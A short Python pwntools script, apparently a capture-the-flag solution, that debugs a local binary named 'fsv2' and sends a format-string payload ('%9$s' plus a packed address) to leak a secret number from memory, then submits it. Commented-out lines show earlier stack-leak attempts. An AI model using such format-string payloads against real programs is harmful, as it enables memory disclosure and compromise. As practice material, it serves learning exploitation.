#!/bin/python

from pwn import *

context.terminal = ['alacritty', '-e', 'sh', '-c']

io = gdb.debug('./fsv2', gdbscript = '''
    b main
    b*0x401315
    c
        ''')


NUMBER_ADDRESS = 0x404080

#io.sendline(b"%7$llx %8$llx %9$llx");

#io.sendline(
#        b'%9$llx  ' +
#        p64(NUMBER_ADDRESS)
#    )

io.sendline(
        b'%9$s    ' +
        p64(NUMBER_ADDRESS)
    )

io.recvuntil(b"Your input: ");
number = u64(io.recv(8));
io.recvline()

log.info("Number: " + str(number));
if ui.yesno("Send to server", True):
    io.sendline(str(number).encode('ASCII'));

io.interactive()
